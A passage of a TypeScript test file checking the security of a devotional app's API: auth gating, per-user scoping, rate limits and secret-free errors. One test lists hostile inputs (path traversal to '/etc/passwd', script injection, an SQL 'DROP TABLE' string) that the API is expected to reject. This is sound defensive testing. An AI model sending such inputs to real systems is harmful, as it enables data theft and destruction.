    libraryRepository.replaceActiveSeries.mockResolvedValue(ACTIVE_ROW)
    libraryRepository.setActiveSeries.mockResolvedValue(ACTIVE_ROW)
    libraryRepository.updateActiveSeriesDay.mockResolvedValue(ACTIVE_ROW)
    savedRepository.listBookmarksWithFallback.mockResolvedValue([])
    savedRepository.addBookmark.mockResolvedValue({
      devotional_slug: 'the-harvest-day-1',
      note: null,
      created_at: '2026-07-28T11:00:00.000Z',
    })
    savedRepository.removeBookmark.mockResolvedValue(true)
    currentReading = { status: 'empty' }
  })

  it('rejects every anonymous caller with 401 AUTH_REQUIRED and no row data', async () => {
    mockedGetUser.mockResolvedValue(null)

    const calls: Array<[string, () => Promise<Response>]> = [
      ['GET /api/devotionals/active', () => activeGet()],
      [
        'PUT /api/devotionals/active',
        () =>
          activePut(
            apiRequest({
              method: 'PUT',
              path: '/api/devotionals/active',
              ip: '203.0.113.10',
              body: { seriesSlug: 'the-harvest' },
            }),
          ),
      ],
      [
        'PATCH /api/devotionals/active',
        () =>
          activePatch(
            apiRequest({
              method: 'PATCH',
              path: '/api/devotionals/active',
              ip: '203.0.113.11',
              body: { currentDay: 2 },
            }),
          ),
      ],
      [
        'DELETE /api/devotionals/active',
        () =>
          activeDelete(
            apiRequest({
              method: 'DELETE',
              path: '/api/devotionals/active',
              ip: '203.0.113.12',
            }),
          ),
      ],
      ['GET /api/devotionals/archive', () => archiveGet()],
      [
        'POST /api/devotionals/archive/restart',
        () =>
          archiveRestart(
            apiRequest({
              method: 'POST',
              path: '/api/devotionals/archive/restart',
              ip: '203.0.113.13',
              body: { seriesSlug: 'the-harvest' },
            }),
          ),
      ],
      ['GET /api/devotionals/saved', () => savedGet()],
      [
        'POST /api/devotionals/saved',
        () =>
          savedPost(
            apiRequest({
              method: 'POST',
              path: '/api/devotionals/saved',
              ip: '203.0.113.14',
              body: { devotionalSlug: 'the-harvest-day-1' },
            }),
          ),
      ],
      [
        'DELETE /api/devotionals/saved',
        () =>
          savedDelete(
            apiRequest({
              method: 'DELETE',
              path: '/api/devotionals/saved?devotionalSlug=the-harvest-day-1',
              ip: '203.0.113.15',
            }),
          ),
      ],
    ]

    for (const [label, invoke] of calls) {
      const response = await invoke()
      expect(response.status, `${label} must be auth-gated`).toBe(401)

      const payload = (await response.json()) as Record<string, unknown>
      expect(payload.code, `${label} must state AUTH_REQUIRED`).toBe(
        'AUTH_REQUIRED',
      )
      // A denial must carry no account data of any shape.
      expect(payload.active).toBeUndefined()
      expect(payload.archived).toBeUndefined()
      expect(payload.saved).toBeUndefined()
      expect(payload.scheduledSwap).toBeUndefined()
    }

    // Denial happens before any repository read — nothing is queried on behalf
    // of an unauthenticated caller.
    expect(libraryRepository.promoteScheduledSwapIfDue).not.toHaveBeenCalled()
    expect(libraryRepository.listArchivedSeries).not.toHaveBeenCalled()
    expect(libraryRepository.replaceActiveSeries).not.toHaveBeenCalled()
    expect(libraryRepository.setActiveSeries).not.toHaveBeenCalled()
    expect(savedRepository.listBookmarksWithFallback).not.toHaveBeenCalled()
    expect(savedRepository.addBookmark).not.toHaveBeenCalled()
    expect(savedRepository.removeBookmark).not.toHaveBeenCalled()
  })

  it('scopes every read and write to the caller id, never to a client-supplied id', async () => {
    libraryRepository.promoteScheduledSwapIfDue.mockResolvedValue(ACTIVE_ROW)

    await activeGet()
    expect(libraryRepository.promoteScheduledSwapIfDue).toHaveBeenCalledWith(
      USER_ID,
    )

    await archiveGet()
    expect(libraryRepository.listArchivedSeries).toHaveBeenCalledWith(USER_ID)

    await activePut(
      apiRequest({
        method: 'PUT',
        path: '/api/devotionals/active',
        ip: '198.51.100.20',
        // A hostile body cannot redirect the write onto another account.
        body: {
          seriesSlug: 'the-harvest',
          userId: 'attacker-owned-id',
          user_id: 'attacker-owned-id',
        },
      }),
    )
    expect(libraryRepository.replaceActiveSeries).toHaveBeenCalledWith(
      expect.objectContaining({ userId: USER_ID }),
    )

    await savedPost(
      apiRequest({
        method: 'POST',
        path: '/api/devotionals/saved',
        ip: '198.51.100.21',
        body: {
          devotionalSlug: 'the-harvest-day-1',
          sessionToken: 'attacker-session',
        },
      }),
    )
    expect(savedRepository.addBookmark).toHaveBeenCalledWith(
      expect.objectContaining({ sessionToken: USER_ID }),
    )
  })

  it('rejects unsafe slugs before they reach the repository', async () => {
    const unsafe = [
      '../../etc/passwd',
      '<script>alert(1)</script>',
      "the-harvest'; DROP TABLE active_series;--",
      'UPPERCASE',
    ]

    for (const seriesSlug of unsafe) {
      const response = await activePut(
        apiRequest({
          method: 'PUT',
          path: '/api/devotionals/active',
          ip: '198.51.100.30',
          body: { seriesSlug },
        }),
      )
      expect(response.status, `${seriesSlug} must be rejected`).toBe(400)
    }

    for (const devotionalSlug of unsafe) {
      const response = await savedPost(
        apiRequest({
          method: 'POST',
          path: '/api/devotionals/saved',
          ip: '198.51.100.31',
          body: { devotionalSlug },
        }),
      )
      expect(response.status, `${devotionalSlug} must be rejected`).toBe(400)
    }

    expect(libraryRepository.replaceActiveSeries).not.toHaveBeenCalled()
    expect(savedRepository.addBookmark).not.toHaveBeenCalled()
  })

  it('caps request bodies instead of parsing unbounded input', async () => {
    const response = await activePut(
      apiRequest({
        method: 'PUT',
        path: '/api/devotionals/active',
        ip: '198.51.100.40',
        body: { seriesSlug: 'the-harvest', note: 'a'.repeat(8_000) },
      }),
    )

    expect(response.status).toBe(413)
    expect(libraryRepository.replaceActiveSeries).not.toHaveBeenCalled()
  })

  it('reports a failed write as 503 PERSISTENCE_FAILED rather than a fake success', async () => {
    libraryRepository.replaceActiveSeries.mockRejectedValue(
      new LibraryPersistenceError('active_series', 'database unavailable'),
    )
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

    const response = await activePut(
      apiRequest({
        method: 'PUT',
        path: '/api/devotionals/active',
        ip: '198.51.100.50',
        body: { seriesSlug: 'the-harvest' },
      }),
    )

    expect(response.status).toBe(503)
    const payload = (await response.json()) as Record<string, unknown>
    expect(payload.code).toBe('PERSISTENCE_FAILED')
    expect(payload.ok).toBeUndefined()
    errorSpy.mockRestore()
  })

  it('keeps secrets and raw failure detail out of error responses', async () => {
    // A driver-level failure typically carries the connection string and the
    // service-role key. None of it may reach the caller.
    const leaky = new Error(
      'connect ECONNREFUSED https://project.supabase.co apikey=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.c2VydmljZV9yb2xlX2tleV9wYXlsb2FkX3RoYXRfaXNfdmVyeV9sb25n.sig SUPABASE_SERVICE_ROLE_KEY missing',
    )
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

    libraryRepository.promoteScheduledSwapIfDue.mockRejectedValue(leaky)
    libraryRepository.listArchivedSeries.mockRejectedValue(leaky)
    savedRepository.listBookmarksWithFallback.mockRejectedValue(leaky)

    const responses = await Promise.all([activeGet(), archiveGet(), savedGet()])

    for (const response of responses) {
      expect(response.status).toBe(500)
      const body = await response.text()
      expect(isSecretExposed(body)).toBe(false)
      expect(body).not.toContain('ECONNREFUSED')
      expect(body).not.toContain('supabase.co')
      // A request id is still returned so the founder can correlate the
      // opaque user-facing message with the structured server log.
      expect(JSON.parse(body).requestId).toBeTruthy()
    }

    errorSpy.mockRestore()
  })

  it('lets anonymous readers ask for their current reading without leaking state', async () => {
    mockedGetUser.mockResolvedValue(null)
    currentReading = { status: 'empty' }

    const response = await soulAuditCurrent()
    const payload = (await response.json()) as Record<string, unknown>

    expect(response.status).toBe(200)
    expect(payload).toMatchObject({ ok: true, hasCurrent: false })
    expect(payload.seriesSlug).toBeUndefined()
    expect(payload.planToken).toBeUndefined()
  })

  it('never rewrites a failed current-reading read as an empty one', async () => {
    // NO SILENT FALLBACKS: an outage must surface, because hasCurrent:false is
    // the same payload a genuinely empty account gets.
    currentReading = {
      status: 'unavailable',
      error: new Error('supabase read failed'),
    }

    await expect(soulAuditCurrent()).rejects.toThrow(/supabase read failed/)
  })
})

describe('Rate limiting is enforced by the real handlers', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mockedGetUser.mockResolvedValue({ id: USER_ID })
    libraryRepository.getActiveSeries.mockResolvedValue(null)
    libraryRepository.getArchivedSeries.mockResolvedValue(null)
    libraryRepository.replaceActiveSeries.mockResolvedValue(ACTIVE_ROW)
    libraryRepository.setActiveSeries.mockResolvedValue(ACTIVE_ROW)
    libraryRepository.removeArchivedSeries.mockResolvedValue(true)
    savedRepository.addBookmark.mockResolvedValue({
      devotional_slug: 'the-harvest-day-1',
      note: null,
      created_at: '2026-07-28T11:00:00.000Z',
    })
  })

  it('stops PUT /api/devotionals/active at its declared per-minute budget', async () => {
    const budget = RATE_LIMITS.find(
      (r) => r.route === '/api/devotionals/active' && r.method === 'PUT',
    )!

    const { accepted, refusal } = await acceptedBeforeRefusal((attempt) =>
      activePut(
        apiRequest({
          method: 'PUT',
          path: '/api/devotionals/active',
          ip: '192.0.2.60',
          body: { seriesSlug: 'the-harvest', currentDay: (attempt % 5) + 1 },
        }),
      ),
    )

    expect(accepted).toBe(budget.maxRequests)
    expect(refusal).not.toBeNull()
    expect(refusal!.headers.get('Retry-After')).toBeTruthy()
    expect(refusal!.headers.get('X-RateLimit-Limit')).toBe(
      String(budget.maxRequests),
    )
    expect(refusal!.headers.get('X-RateLimit-Remaining')).toBe('0')
    expect(isSecretExposed(await refusal!.text())).toBe(false)
  })

  it('stops POST /api/devotionals/archive/restart at its declared budget', async () => {
    const budget = RATE_LIMITS.find(
      (r) => r.route === '/api/devotionals/archive/restart',
    )!

    const { accepted, refusal } = await acceptedBeforeRefusal(() =>
      archiveRestart(
        apiRequest({
          method: 'POST',
          path: '/api/devotionals/archive/restart',
          ip: '192.0.2.61',
          body: { seriesSlug: 'the-harvest' },
        }),
      ),
    )

    expect(accepted).toBe(budget.maxRequests)
    expect(refusal!.status).toBe(429)
    expect(refusal!.headers.get('X-RateLimit-Limit')).toBe(
      String(budget.maxRequests),
    )
  })

  it('stops POST /api/devotionals/saved at its declared budget', async () => {
    const budget = RATE_LIMITS.find(
      (r) => r.route === '/api/devotionals/saved' && r.method === 'POST',
    )!

    const { accepted, refusal } = await acceptedBeforeRefusal(() =>
      savedPost(
        apiRequest({
          method: 'POST',
          path: '/api/devotionals/saved',
          ip: '192.0.2.62',
          body: { devotionalSlug: 'the-harvest-day-1' },
        }),
      ),
    )

    expect(accepted).toBe(budget.maxRequests)
    expect(refusal!.status).toBe(429)
  })

  it('keys the limiter per caller, so one abuser cannot lock everyone else out', async () => {
    const budget = RATE_LIMITS.find(
      (r) => r.route === '/api/devotionals/active' && r.method === 'PUT',
    )!

    const abuser = await acceptedBeforeRefusal(() =>
      activePut(
        apiRequest({
          method: 'PUT',
          path: '/api/devotionals/active',
          ip: '192.0.2.70',
          body: { seriesSlug: 'the-harvest' },
        }),
      ),
    )
    expect(abuser.accepted).toBe(budget.maxRequests)

    const bystander = await activePut(
      apiRequest({
        method: 'PUT',
        path: '/api/devotionals/active',
        ip: '192.0.2.71',
        body: { seriesSlug: 'the-harvest' },
      }),
    )
    expect(bystander.status).toBe(200)
  })
})

describe('Contract tables reference shipped routes', () => {
  // The guard that stops this file drifting back onto imaginary endpoints. It
  // is what would have caught the /api/daily-bread/* fixtures on the day the
  // three-slot architecture was abandoned.
  function handlerExists(route: string): boolean {
    const file = route.startsWith('/api/') ? 'route.ts' : 'page.tsx'
    return existsSync(
      join(process.cwd(), 'src', 'app', ...route.split('/'), file),
    )
  }

  it('every rate-limited route has a handler on disk', () => {
    for (const config of RATE_LIMITS) {
      expect(
        handlerExists(config.route),
        `${config.route} has a rate-limit contract but no handler`,
      ).toBe(true)
    }
  })

  it('every role-gated route has a handler on disk', () => {
    for (const permission of ROLE_PERMISSIONS) {
      expect(
        handlerExists(permission.route),
        `${permission.route} has a role contract but no handler`,
      ).toBe(true)
    }
  })

  it('every admin route has a page on disk', () => {
    for (const route of ADMIN_ROUTES) {
      expect(handlerExists(route), `${route} has no page`).toBe(true)
    }
  })

  it('the retired admin mockup pages are off disk (SA-090 / F-136)', () => {
    for (const route of ['/admin/youtube-allowlist', '/admin/feed-controls']) {
      expect(handlerExists(route), `${route} unexpectedly exists`).toBe(false)
      expect(ADMIN_ROUTES, `${route} is still asserted`).not.toContain(route)
    }
  })

  it('the retired three-slot Daily Bread endpoints are not asserted anywhere', () => {
    const retired = [
      '/api/daily-bread/state',
      '/api/daily-bread/activate',
      '/api/daily-bread/replace-slot',
      '/api/daily-bread/switch-current',
    ]
    const contractedRoutes = [
      ...RATE_LIMITS.map((r) => r.route),
      ...ROLE_PERMISSIONS.map((r) => r.route),
    ]
    for (const route of retired) {
      expect(handlerExists(route), `${route} unexpectedly exists`).toBe(false)
      expect(contractedRoutes, `${route} is still asserted`).not.toContain(
        route,
      )
    }
  })
})
